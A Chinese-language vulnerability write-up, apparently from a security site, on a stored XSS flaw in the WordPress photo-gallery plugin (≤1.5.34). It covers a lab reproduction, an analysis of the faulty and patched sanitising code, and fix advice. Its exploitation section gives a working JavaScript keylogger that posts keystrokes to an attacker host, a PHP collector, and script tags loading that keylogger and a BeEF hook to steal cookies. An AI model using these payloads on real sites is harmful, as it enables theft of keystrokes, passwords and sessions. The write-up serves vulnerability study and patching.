##  前言

**WordPress起初是一款个人博客系统，后来逐步地演化成为一款内容管理系统软件。它使用PHP语言和MySQL数据库开发而成，用户可以在支持相应版本的PHP
和 MySQL数据库的服务器上方便快捷地搭建自己的博客或者网站。WordPress中的photo-gallery插件可以让用户在短短几分钟内构建十分漂亮精美的照片库。在photo-gallery
<=1.5.34的版本中存在存储型XSS漏洞，一旦被黑客利用，将会产生非常严重的后果，本文我们详细讨论该漏洞。**

##  实验环境

> 1.渗透主机：kali-linux-2018.3-vm-i386
>
> 2.目标主机：Debian9.6 x64
>
> 3.软件版本：wordpress-5.2.2
>
> 4.插件版本：photo-gallery.1.5.34

##  涉及工具

> 1.XAMPP for Linux 5.6.30
>
> 2.BeEF 0.4.7.0-alpha
>
> 3.Mozilla Firefox 60.6.2

##  漏洞复现

1.在photo-gallery的Add
Galleries/Images模块中新建一个名为Test的照片库，在Basic和Advanced中分别添加图片，如下图所示：

![](https://image.3001.net/images/20190917/1568730541_5d80edad89d7c.png!small)

2.设置Gallery title、Slug以及Description等条目的信息，如下图所示：

![](https://image.3001.net/images/20190917/1568730562_5d80edc21ec6a.png!small)

3.选中图片进行编辑，在图片的Alt/Title文本框中输入如下脚本：

    
    
    <script>alert("Hello");</script>

在Description文本框中输入如下脚本：

    
    
    <script>alert("World");</script>

用于验证这两处是否存在XSS漏洞，如下图所示：

![](https://image.3001.net/images/20190917/1568730697_5d80ee4920562.png!small)

4.点击Gallery中的save按钮保存照片库设置，然后点击Preview按钮，可以看到“Hello”弹窗，说明Alt/Title文本框存在XSS漏洞，如下图所示：

![](https://image.3001.net/images/20190917/1568730721_5d80ee61ac3f5.png!small)

5.在点击Gallery中的Preview按钮之后，再点击页面中的图片，可以看到“World”弹窗，说明Description文本框也存在XSS漏洞，如下图所示：

![](https://image.3001.net/images/20190917/1568730748_5d80ee7ce0a63.png!small)

由此我们可以确定，在插件photo-gallery的Add Galleries/Images模块中存在两处存储型XSS漏洞。只要用户点击了如下URL：

> <http://192.168.188.155/wordpress/bwg_gallery/testxss/>

或者点击了该页面中的图片，就会遭受到XSS恶意脚本的攻击。

##  漏洞分析

通过分析源代码，我们找到了XSS漏洞的产生点，有关的问题源码具体如下：

    
    
    $description = str_replace(array('\\', '\t'), '', WDWLibrary::get('image_description_' . $image_id, ''));
    $alt = str_replace(array('\\', '\t'), '',  WDWLibrary::get('image_alt_text_' . $image_id, '', FALSE));
    $alt = esc_html(preg_replace("/]*>|<\/a>/", '', $alt));

变量description和alt分别对应页面中的Description和Alt/Title区域。

类WDWLibrary的静态函数get和validate_data的具体代码如下：

    
    
    public static function get($key, $default_value = '', $esc_html = true) {
        if (isset($_GET[$key])) {
          $value = $_GET[$key];
        }
        elseif (isset($_POST[$key])) {
          $value = $_POST[$key];
        }
        elseif (isset($_REQUEST[$key])) {
          $value = $_REQUEST[$key];
        }
        else {
          $value = $default_value;
        }
        if (is_array($value)) {
          array_walk_recursive($value, array('self', 'validate_data'), $esc_html);
        }
        else {
          self::validate_data($value, $esc_html);
        }
        return $value;
      }
      private static function validate_data(&$value, $esc_html) {
        $value = stripslashes($value);
        if ($esc_html) {
          $value = esc_html($value);
        }
      }

$description在使用类WDWLibrary的静态函数get时，未给参数$esc_html赋值，那么$esc_html使用默认值true，即直接使用esc_html函数对从前端获取到的数据进行过滤消毒。$alt在使用类WDWLibrary的静态函数get时，给参数$esc_html赋值FALSE，即在get函数中不使用esc_html函数过滤消毒，而是先使用preg_replace函数进行正则表达式匹配，再使用esc_html函数进行过滤。

函数esc_html的代码如下：

    
    
    function esc_html( $text ) {
    	$safe_text = wp_check_invalid_utf8( $text );
    	$safe_text = _wp_specialchars( $safe_text, ENT_QUOTES );
    	return apply_filters( 'esc_html', $safe_text, $text );
    }

在preg_replace函数中使用的正则表达式"/<a[^>]*>|<\/a>/"无法匹配类似于<script>alert("Hello");</script>的XSS测试脚本。

wp_check_invalid_utf8函数用于检查字符串中是否存在无效的utf8编码。

_wp_specialchars函数将一些特殊字符转换为其HTML实体，具体包含&, <, >, ", and
'.这些字符，但只是将这些特殊字符进行html编码存储，并没有将其过滤。

综上，过滤方法并未起作用，因此XSS脚本完整地保存在了MySQL数据库中，如下图所示：

![](https://image.3001.net/images/20190917/1568731044_5d80efa43494b.png!small)

##  漏洞修复

针对版本号<=1.5.34的模块中存在的XSS漏洞，建议及时将Photo-Gallery模块更新到1.5.35及以上版本。在1.5.35版本中，问题代码得到了修复，修复后的代码如下：

    
    
    $description = str_replace(array('\\', '\t'), '', WDWLibrary::get('image_description_' . $image_id, 'wp_filter_post_kses'));
    $alt = str_replace(array('\\', '\t'), '',  WDWLibrary::get('image_alt_text_' . $image_id, '', 'wp_filter_post_kses'));
    $alt = preg_replace("/]*>|<\/a>/", '', $alt);

$description和$alt在使用类WDWLibrary的静态函数get时，都给get函数传入了参数wp_filter_post_kses，用于对从前端获取到的数据进行过滤消毒。

函数wp_filter_post_kses利用addslashes在函数wp_kses返回的数据中的预定义字符之前添加反斜杠，具体代码如下：

    
    
    function wp_filter_post_kses( $data ) {
    	return addslashes( wp_kses( stripslashes( $data ), 'post' ) );
    }

函数wp_kses用于过滤文本内容并且删除不允许的HTML字符串，返回仅包含允许的HTML字符串的筛选内容，具体代码如下：

    
    
    function wp_kses( $string, $allowed_html, $allowed_protocols = array() ) {
    	if ( empty( $allowed_protocols ) ) {
    		$allowed_protocols = wp_allowed_protocols();
    	}
    	$string = wp_kses_no_null( $string, array( 'slash_zero' => 'keep' ) );
    	$string = wp_kses_normalize_entities( $string );
    	$string = wp_kses_hook( $string, $allowed_html, $allowed_protocols );
    	return wp_kses_split( $string, $allowed_html, $allowed_protocols );
    }

其中函数wp_kses_split通过正则表达式可以准确匹配并过滤XSS脚本代码，具体代码如下：

    
    
    function wp_kses_split( $string, $allowed_html, $allowed_protocols ) {
    	global $pass_allowed_html, $pass_allowed_protocols;
    	$pass_allowed_html      = $allowed_html;
    	$pass_allowed_protocols = $allowed_protocols;
    	return preg_replace_callback( '%(|$))|(<[^>]*(>|$)|>)%', '_wp_kses_split_callback', $string );
    }

修复后的代码中，将类WDWLibrary的静态函数get中的形参$esc_html = true修改为$callback =
'esc_html'，此时默认使用esc_html函数进行过滤；如果有实参传入，本例中传入wp_filter_post_kses，那么就使用wp_filter_post_kses函数进行过滤。

语句array_walk_recursive($value, array('self', 'validate_data'),
$callback)，将参数$callback传递到类WDWLibrary本身的静态函数validate_data中，然后使用validate_data函数循环处理数组value中的值。

静态函数get的具体代码如下：

    
    
    public static function get($key, $default_value = '', $callback = 'esc_html') {
        if (isset($_GET[$key])) {
          $value = $_GET[$key];
        }
        elseif (isset($_POST[$key])) {
          $value = $_POST[$key];
        }
        elseif (isset($_REQUEST[$key])) {
          $value = $_REQUEST[$key];
        }
        else {
          $value = $default_value;
        }
        if (is_array($value)) {
          array_walk_recursive($value, array('self', 'validate_data'), $callback);
        }
        else {
          self::validate_data($value, $callback);
        }
        return $value;
      }

静态函数validate_data的代码如下：

    
    
    private static function validate_data(&$value, $callback) {
        $value = stripslashes($value);
        if ( $callback ) {
          $value = $callback($value);
        }
      }

##  漏洞利用

1.利用XSS漏洞获取键盘记录：

1.1将keyrecorder.js和keyrecorder.php保存到渗透主机Kali的/var/www/html目录下，通过命令service
apache2 start来启动apache服务。

keyrecorder.js代码如下：

    
    
    document.onkeypress = function(evt){
    	evt = evt || window.event
    	keyrecord = String.fromCharCode(evt.charCode)
    	if (keyrecord) {
    		var http = new XMLHttpRequest();
    		var param = encodeURI(keyrecord);
    		http.open("POST","http://192.168.188.156/keyrecorder.php",true);
    		http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    		http.send("keyrecord="+param);
    		}
    }

keyrecorder.php代码如下：

    
    
    <?php
     $key=$_POST['keyrecord'];
     $record_file="keyrecord.txt"; 
     $record_fp = fopen($record_file, "a");
     fwrite($record_fp, $key);
     fclose($record_fp); 
    ?>

1.2在Alt/Title或者Description文本框中输入如下语句:

    
    
    <script src="http://192.168.188.156/keyrecorder.js"></script>

点击save按钮保存修改，再点击Preview进行照片库预览。

1.3然后在页面<http://192.168.188.155/wordpress/bwg_gallery/testxss/>中的所有键盘记录均会被采集并发送到渗透主机Kali，这里我们输入Hello
World！，Kali中的keyrecord.txt的内容如下图所示（键盘记录采集成功）：

![](https://image.3001.net/images/20190917/1568731791_5d80f28f65bee.png!small)

如果某个Web系统的登录页面中存在存储型的XSS漏洞，只要用户输入用户名和密码，那么用户名和密码不知不觉中就会被传输到攻击者的主机中，这是极其危险的。

2.利用BeEF进行更多的操作：

2.1在Kali Linux中启动BeEF，在Alt/Title或者Description文本框中输入如下语句：

    
    
    <script src="http://192.168.188.156:3000/hook.js"></script>

然后在photo-gallery的Preview（预览）功能中触发XSS脚本，接着BeEF就捕获到了受害者主机，如下图所示：

![](https://image.3001.net/images/20190917/1568732471_5d80f53784282.png!small)

2.2通过BeEF可以获取受害者主机的Cookie。如果获取到的是管理员的Cookie，是不是瞬间感觉XSS跟SQL注入一样有魅力呢？是不是感觉XSS并不鸡肋了呢？结果如下图所示：

![](https://image.3001.net/images/20190917/1568732504_5d80f55852362.png!small)

2.3BeEF可以检索并获取目标页面中的所有链接，利用这一特性可以针对目标服务器进行更深一步的信息收集，结果如下图所示：

![](https://image.3001.net/images/20190917/1568732539_5d80f57bea110.png!small)

2.4BeEF还可以检测受害者机器是否为虚拟机，结果如下图所示：

![](https://image.3001.net/images/20190917/1568732557_5d80f58db75f7.png!small)

PS：BeEF的功能十分强大，可以进行的操作远不止这些，这里只是简单列举了其中三个功能。

##  总结：

XSS漏洞的防御涉及输入和输出两部分。

> 一、对用户输入的数据进行过滤消毒，包括HTML 特性、JavaScript关键字、空字符、特殊字符等等，本文中的修复方式属于这个范畴。
>
> 二、对输出到页面上的内容进行相应的编码转换，包括HTML实体编码、JavaScript编码等。

 ***本文原创作者：Neroqi，本文属于FreeBuf原创奖励计划，未经许可禁止转载**  

